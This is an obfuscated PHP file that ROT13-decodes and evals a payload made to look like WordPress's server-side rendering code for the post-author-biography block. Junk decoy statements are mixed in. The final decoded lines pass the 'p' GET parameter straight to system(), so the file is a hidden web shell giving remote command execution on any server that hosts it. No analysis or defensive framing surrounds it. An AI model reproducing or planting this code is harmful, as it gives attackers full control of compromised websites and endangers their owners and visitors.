<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/cbfg-nhgube-ovbtencul` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/cbfg-nhgube-ovbtencul` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 *
 * @cnenz  neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz  fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz  JC_Oybpx $oybpx      Oybpx vafgnapr.
 * @erghea fgevat Ergheaf gur eraqrerq cbfg nhgube ovbtencul oybpx.
 */
shapgvba eraqre_oybpx_pber_cbfg_nhgube_ovbtencul( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( vffrg( $oybpx->pbagrkg['cbfgVq'] ) ) {
		$nhgube_vq = trg_cbfg_svryq( 'cbfg_nhgube', $oybpx->pbagrkg['cbfgVq'] );
	} ryfr {
		$nhgube_vq = trg_dhrel_ine( 'nhgube' );
	}

	vs ( rzcgl( $nhgube_vq ) ) {
		erghea '';
	}

	$nhgube_ovbtencul = trg_gur_nhgube_zrgn( 'qrfpevcgvba', $nhgube_vq );
	vs ( rzcgl( $nhgube_ovbtencul ) ) {
		erghea '';
	}

	$nyvta_pynff_anzr   = rzcgl( $nggevohgrf['grkgNyvta'] ) ? '' : \"unf-grkg-nyvta-{$nggevohgrf['grkgNyvta']}\";
	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => $nyvta_pynff_anzr ) );

	erghea fcevags( '<qvi %1$f>', $jenccre_nggevohgrf ) . $nhgube_ovbtencul . '</qvi>';
}

/**
 * Ertvfgref gur `pber/cbfg-nhgube-ovbtencul` oybpx ba gur freire.
 *
 * @fvapr 6.0.0
 */
shapgvba ertvfgre_oybpx_pber_cbfg_nhgube_ovbtencul() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/cbfg-nhgube-ovbtencul',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_cbfg_nhgube_ovbtencul',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_cbfg_nhgube_ovbtencul' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>